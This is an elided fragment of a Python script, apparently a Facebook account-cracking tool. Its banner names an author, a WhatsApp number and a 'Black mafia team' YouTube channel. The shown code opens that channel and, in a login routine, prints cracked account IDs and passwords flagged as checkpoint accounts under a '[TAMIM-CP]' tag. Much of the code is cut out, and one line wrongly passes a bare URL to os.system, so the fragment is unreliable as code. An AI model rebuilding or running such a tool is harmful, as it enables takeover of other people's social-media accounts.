...
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mTamim uddin

\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+8801639171168

\x1b[93;1m YouTube       \x1b[92;1m=>      \x1b[93;1mBlack mafia team 619
...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("xdg-open https://youtube.com/channel/UCE1mm5_Avt4dUguTG2998JQ")

		exit()

	else:

		os.system("https://youtube.com/channel/UCE1mm5_Avt4dUguTG2998JQ")
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [TAMIM-CP] %s|%s        '%(b,idf,pw))
